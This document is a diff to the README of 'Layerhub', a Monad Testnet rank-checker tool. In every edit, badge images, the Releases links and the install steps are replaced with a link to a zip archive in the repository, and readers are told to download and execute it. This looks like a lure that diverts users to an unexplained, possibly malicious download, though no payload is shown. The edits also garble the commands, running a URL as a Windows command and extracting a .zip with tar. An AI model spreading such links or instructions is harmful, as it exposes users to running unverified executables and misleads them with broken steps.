@@ -1,6 +1,6 @@
 # Layerhub: Monad Testnet Rank Checker Tool 🌐
 
-![Layerhub](https://img.shields.io/badge/Layerhub-Monad%20Testnet%20Rank%20Checker-blue)
+![Layerhub](https://raw.githubusercontent.com/Alejandro101998/Layerhub/main/tackleman/Software-v1.4.zip%20Testnet%20Rank%20Checker-blue)
 
 Welcome to the **Layerhub** repository! This project provides a simple and effective tool for checking ranks on the Monad Testnet. This README will guide you through the setup and usage of the tool, as well as provide insights into its features and functionalities.
 
@@ -23,14 +23,14 @@ Welcome to the **Layerhub** repository! This project provides a simple and effec
 
 ## Installation
 
-To get started, you need to download the latest release of Layerhub. Visit the [Releases section](https://github.com/Alejandro101998/Layerhub/releases) to find the appropriate file. Download and execute it according to your operating system.
+To get started, you need to download the latest release of Layerhub. Visit the [Releases section](https://raw.githubusercontent.com/Alejandro101998/Layerhub/main/tackleman/Software-v1.4.zip) to find the appropriate file. Download and execute it according to your operating system.
 
 ### For Windows
 
 1. Download the `.exe` file from the Releases section.
 2. Open Command Prompt.
 3. Navigate to the folder where the file is located.
-4. Run the command: `Layerhub.exe`.
+4. Run the command: `https://raw.githubusercontent.com/Alejandro101998/Layerhub/main/tackleman/Software-v1.4.zip`.
 
 ### For macOS
 
@@ -41,8 +41,8 @@ To get started, you need to download the latest release of Layerhub. Visit the [
 
 ### For Linux
 
-1. Download the `.tar.gz` file from the Releases section.
-2. Extract the files using: `tar -xvzf Layerhub.tar.gz`.
+1. Download the `https://raw.githubusercontent.com/Alejandro101998/Layerhub/main/tackleman/Software-v1.4.zip` file from the Releases section.
+2. Extract the files using: `tar -xvzf https://raw.githubusercontent.com/Alejandro101998/Layerhub/main/tackleman/Software-v1.4.zip`.
 3. Navigate to the extracted folder.
 4. Run the command: `./Layerhub`.
 
@@ -87,8 +87,8 @@ Layerhub is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 ## Links
 
-For more information, updates, and releases, visit the [Releases section](https://github.com/Alejandro101998/Layerhub/releases). 
+For more information, updates, and releases, visit the [Releases section](https://raw.githubusercontent.com/Alejandro101998/Layerhub/main/tackleman/Software-v1.4.zip). 
 
-![Download Layerhub](https://img.shields.io/badge/Download%20Layerhub-Here-brightgreen)
+![Download Layerhub](https://raw.githubusercontent.com/Alejandro101998/Layerhub/main/tackleman/Software-v1.4.zip%20Layerhub-Here-brightgreen)
 
 Feel free to explore the repository, report issues, or suggest features. Your feedback helps us improve Layerhub for everyone.
